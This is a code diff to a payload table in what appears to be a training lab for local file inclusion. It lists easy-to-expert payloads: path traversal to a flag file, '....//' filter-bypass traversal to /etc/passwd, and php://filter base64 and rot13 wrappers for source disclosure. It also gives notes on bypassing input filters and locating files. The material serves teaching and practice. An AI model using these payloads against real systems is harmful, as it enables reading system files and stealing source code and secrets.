@@ -231,7 +231,7 @@ const PAYLOADS = {
  },
  pg:{
   easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal. Goal: read a file OUTSIDE the web root (the secret flag)."},
-  medium:{p:"....//....//....//....//....//....//....//....//etc/passwd", n:"Medium — '../' stripped once → ....//. Goal: climb to / and read a system file (/etc/passwd = the user list)."},
+  medium:{p:"....//....//....//....//....//....//....//etc/passwd", n:"Medium — '../' stripped once → ....//. Goal: climb to / and read a system file (/etc/passwd = the user list)."},
   hard:{p:"php://filter/convert.base64-encode/resource=db.php", n:"Hard — '../' stripped recursively (....// dies) → php://filter wrapper. Goal: SOURCE DISCLOSURE — base64-decode a .php file to read its source. How you'd know db.php exists: first filter-read a page you KNOW is there (e.g. home.php) — its require/include lines name the other files (db.php, levels.php…). Or fuzz common names (db.php/config.php)."},
   expert:{p:"php://filter/read=string.rot13/resource=../lfi_secret/flag.txt", n:"Expert — + 'base64' blocked → string.rot13 filter. Goal: still exfiltrate the flag; rot13 the output back."}
  }
